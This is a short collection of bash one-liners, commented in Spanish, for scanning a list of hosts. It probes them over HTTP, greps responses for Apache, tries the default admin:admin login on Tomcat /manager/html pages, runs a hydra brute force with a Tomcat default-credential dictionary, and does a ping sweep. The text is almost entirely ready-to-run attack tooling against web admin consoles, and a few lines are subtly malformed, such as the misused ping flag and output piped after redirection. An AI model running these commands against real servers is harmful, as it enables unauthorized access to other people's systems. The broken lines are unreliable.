#Test sacar de las lista inicial de IP/URLS, cuales responden realmente con respuesta HTTP
for line in $(cat IPs/URLS.txt); do echo $line; curl -ks -i $line 2>/dev/null >> prueba.txt | grep "HTTP/" && echo TRUE||echo FALSE;done

#Verificar que es y que no es realmente una URL de una lista:
for line in $(cat IPs/URLS.txt); do curl -ks -i --connect-timeout 3 $line 2>/dev/null | grep "HTTP/" >/dev/null && echo "TRUE - $line" | grep TRUE | awk '{print $3}' >> results.txt || echo "FALSE - $line";done

#Buscar cosas concretas en respuestas HTTP (Ejemplo saca lista de todo lo que contenga la palabra apache)
for line in $(cat test.txt); do curl -ks -i --connect-timeout 3 $line 2>/dev/null | grep -i "apache" >/dev/null && echo "TRUE - $line" | grep TRUE | awk '{print $3}' >> apache.txt || echo "FALSE - $line";done

#Prueba autenticaciÃ³n basic http en los (en este ejemplo Tomcat) localizados
for line in $(cat manager_html_401.txt);do curl -H "Authorization: Basic $(echo -n admin:admin | base64)" $line/manager/html -k -is | grep "HTTP/1.1 200" >/dev/null&& echo "TRUE - $line" || echo "FALSE - $line";done

#BruteForce for auth
for line in $(cat manager_html_401_ip_port.txt); do hydra `echo $line | awk -F: '{print $1}'` -s `echo $line | awk -F: '{print $2}'` -C tomcat_def.dic https-get /manager/html;done

# Ping Sweep
for line in $(cat IPs/URLS.txt); do echo $line; ping -c 1 -w $line 2>/dev/null >> prueba.txt | grep "bytes from" ;done
